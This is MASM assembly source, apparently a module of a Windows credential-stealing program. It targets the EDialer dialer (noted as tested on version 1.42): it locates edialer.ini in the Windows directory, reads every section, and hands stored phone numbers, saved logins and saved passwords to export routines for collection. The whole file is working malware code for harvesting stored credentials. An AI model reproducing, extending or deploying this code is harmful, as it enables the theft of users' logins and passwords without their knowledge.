; EDialer
; Tested on EDialer 1.42

.data
	@AllocStr	<szEdialerFmt>,		<"Phone_%lu">
	@AllocStr	<szEdialerPass>,	<"PasswordSaved">
	@AllocStr	<szEdialerLogin>,	<"LoginSaved">	
	@AllocStr	<szEDialerIni>,		<"\edialer.ini">
	@AllocMem	<lpEDialerCommonBuf>,	<MAX_PATH+1>
	@AllocMem	<lpEDialerSections>,	<2048>
	@AllocMem	<lpEDialerFmtBuf>,	<256>

.code

WriteEDialerParam proc lpKey, dwType: DWORD
	LOCAL	szDestBuf[MAX_PATH+1]: BYTE
	
	invoke  GetPrivateProfileString, edi, lpKey, offset szNilStr, addr szDestBuf, MAX_PATH, offset lpEDialerCommonBuf
	.IF	eax
		invoke	ExportData, dwType, 0, addr szDestBuf, eax 
		mov	eax, TRUE
	.ENDIF	
	ret
WriteEDialerParam endp

GetEDialerOutput proc uses edi ebx
	; Write header	
	invoke	ExportModule, MODULE_EDIALER

	; Get EDialer.ini path	
	invoke	GetWindowsDirectory, offset lpEDialerCommonBuf, MAX_PATH
	invoke	lstrcat, offset lpEDialerCommonBuf, offset szEDialerIni
	
	mov	edi, offset lpEDialerSections
	
        invoke  GetPrivateProfileSectionNames, edi, 2046, offset lpEDialerCommonBuf
        test	eax, eax
        jz	@ret
        
@l:
	invoke	ExportStr, TYPE_EDIALER_ENTRY, 0, edi
	
	mov	ebx, 50
@read_data:
	; Phones
	invoke	wsprintf, offset lpEDialerFmtBuf, offset szEdialerFmt, ebx
	invoke	WriteEDialerParam, offset lpEDialerFmtBuf, TYPE_EDIALER_PHONE
	dec	ebx
	jnz	@read_data
	
	; Login
	invoke	WriteEDialerParam, offset szEdialerLogin, TYPE_EDIALER_LOGIN	
	
 	; Password
	invoke	WriteEDialerParam, offset szEdialerPass, TYPE_EDIALER_PASS	
	        
        @Next	@l
	
@ret:	
	ret
GetEDialerOutput endp